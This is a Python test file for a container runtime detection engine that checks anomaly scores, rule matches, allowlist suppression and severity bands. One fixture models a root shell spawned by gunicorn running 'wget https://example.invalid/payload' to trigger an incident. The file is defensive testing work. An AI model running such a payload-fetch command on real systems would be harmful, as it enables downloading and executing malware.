from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

import pytest

from porygon_api.detection import (
    RULESET_VERSION,
    allowlist_set_hash,
    build_allowlist_matcher_hash,
    build_detection_run_key,
    confidence_level,
    evaluate_detection,
    ruleset_hash,
    severity_level,
)


@dataclass
class Profile:
    image_digest: str = "example/app@sha256:" + "a" * 64
    features: dict = field(
        default_factory=lambda: {
            "observed_sets": {
                "executables": ["/usr/bin/python", "/usr/bin/gunicorn"],
                "process_names": ["python", "gunicorn"],
                "user_uids": ["1000"],
            }
        }
    )


@dataclass
class Score:
    score_id: str = "00000000-0000-0000-0000-000000000001"
    status: str = "scored"
    total_score: float | None = 0.1
    score_band: str = "baseline_like"
    algorithm_version: str = "porygon.distance.v1"
    window_start: datetime = datetime(2026, 7, 21, 10, 0, tzinfo=timezone.utc)
    window_end: datetime = datetime(2026, 7, 21, 10, 1, tzinfo=timezone.utc)


@dataclass
class ProcessEvent:
    event_id: str
    occurred_at: datetime
    container_id: str | None
    process_name: str | None
    executable: str | None
    parent_name: str | None = None
    parent_executable: str | None = None
    command_line: str | None = None
    user_uid: int | None = 1000
    parent_event_id: str | None = None


@dataclass
class Allowlist:
    allowlist_id: str
    matcher_hash: str
    rule_id: str
    executable: str | None
    parent_executable: str | None = None
    expires_at: datetime | None = None


@dataclass
class RuntimeEvent:
    event_id: str
    occurred_at: datetime
    container_id: str | None
    event_type: str
    action: str
    command: str | None = None
    image_digest: str | None = None
    container_snapshot: dict = field(default_factory=dict)


def test_baseline_like_known_process_has_no_detection_findings() -> None:
    score = Score()
    event = ProcessEvent(
        event_id="p1",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="python",
        executable="/usr/bin/python",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
    )

    assert result["status"] == "no_findings"
    assert result["incident_eligible"] is False
    assert result["matches"] == []
    assert result["anomaly_score"] == pytest.approx(0.1)


def test_unseen_root_shell_to_tool_chain_creates_explainable_incident_signal() -> None:
    score = Score(total_score=0.82, score_band="extreme")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=0,
    )
    tool = ProcessEvent(
        event_id="p-tool",
        occurred_at=score.window_start + timedelta(seconds=20),
        container_id="c1",
        process_name="wget",
        executable="/usr/bin/wget",
        parent_name="sh",
        parent_executable="/bin/sh",
        command_line="wget https://example.invalid/payload",
        user_uid=0,
        parent_event_id="p-shell",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell, tool],
        runtime_events=[],
    )

    rule_ids = {item["rule_id"] for item in result["matches"]}
    assert {"POR-DET-001", "POR-DET-002", "POR-DET-003", "POR-DET-004", "POR-DET-005"}.issubset(rule_ids)
    assert result["status"] == "incident_created"
    assert result["incident_eligible"] is True
    assert result["severity_score"] >= 0.75
    assert 0.0 <= result["confidence_score"] <= 1.0
    assert result["severity_score"] != result["confidence_score"]


def test_docker_exec_is_informational_without_stronger_evidence() -> None:
    score = Score(total_score=0.2, score_band="baseline_like")
    runtime = RuntimeEvent(
        event_id="r1",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c1",
        event_type="container",
        action="exec_start",
        command="echo test",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[runtime],
    )

    assert result["status"] == "findings_only"
    assert result["incident_eligible"] is False
    assert [item["rule_id"] for item in result["matches"]] == ["POR-DET-006"]


def test_insufficient_score_never_creates_an_incident() -> None:
    score = Score(status="insufficient_data", total_score=None, score_band="insufficient_data")
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
    )

    assert result["status"] == "insufficient_data"
    assert result["incident_eligible"] is False
    assert result["severity_score"] is None


def test_ruleset_and_run_keys_are_deterministic_and_versioned() -> None:
    assert RULESET_VERSION == "porygon.detection.v1"
    assert len(ruleset_hash()) == 64
    empty_hash = allowlist_set_hash([])
    first = build_detection_run_key("00000000-0000-0000-0000-000000000001", empty_hash)
    second = build_detection_run_key("00000000-0000-0000-0000-000000000001", empty_hash)
    changed_score = build_detection_run_key("00000000-0000-0000-0000-000000000002", empty_hash)
    changed_allowlists = build_detection_run_key(
        "00000000-0000-0000-0000-000000000001",
        "f" * 64,
    )
    assert first == second
    assert first != changed_score
    assert first != changed_allowlists


def test_severity_and_confidence_bands_are_explicit() -> None:
    assert severity_level(0.0) == "low"
    assert severity_level(0.25) == "medium"
    assert severity_level(0.5) == "high"
    assert severity_level(0.75) == "critical"
    assert confidence_level(0.0) == "low"
    assert confidence_level(0.35) == "medium"
    assert confidence_level(0.70) == "high"


def test_high_distance_alone_is_informational_not_an_incident() -> None:
    score = Score(total_score=0.9, score_band="extreme")
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
    )
    assert result["status"] == "findings_only"
    assert result["incident_eligible"] is False
    assert [item["rule_id"] for item in result["matches"]] == ["POR-DET-001"]


def test_digest_scoped_exact_allowlist_suppresses_only_matching_shell() -> None:
    score = Score(total_score=0.2, score_band="baseline_like")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=1000,
    )
    matcher_hash = build_allowlist_matcher_hash(
        image_digest=Profile().image_digest,
        rule_id="POR-DET-002",
        executable="/bin/sh",
        parent_executable="/usr/bin/gunicorn",
    )
    allowlist = Allowlist(
        allowlist_id="00000000-0000-0000-0000-000000000099",
        matcher_hash=matcher_hash,
        rule_id="POR-DET-002",
        executable="/bin/sh",
        parent_executable="/usr/bin/gunicorn",
    )
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell],
        runtime_events=[],
        allowlists=[allowlist],
    )
    assert result["status"] == "no_findings"
    assert result["matches"] == []
    assert result["suppressed_matches"][0]["rule_id"] == "POR-DET-002"
    assert result["suppressed_matches"][0]["suppressed_by_allowlist_id"] == allowlist.allowlist_id

    other_shell = ProcessEvent(
        event_id="p-other",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c2",
        process_name="bash",
        executable="/bin/bash",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=1000,
    )
    other_result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[other_shell],
        runtime_events=[],
        allowlists=[allowlist],
    )
    assert other_result["status"] == "incident_created"
    assert other_result["matches"][0]["rule_id"] == "POR-DET-002"
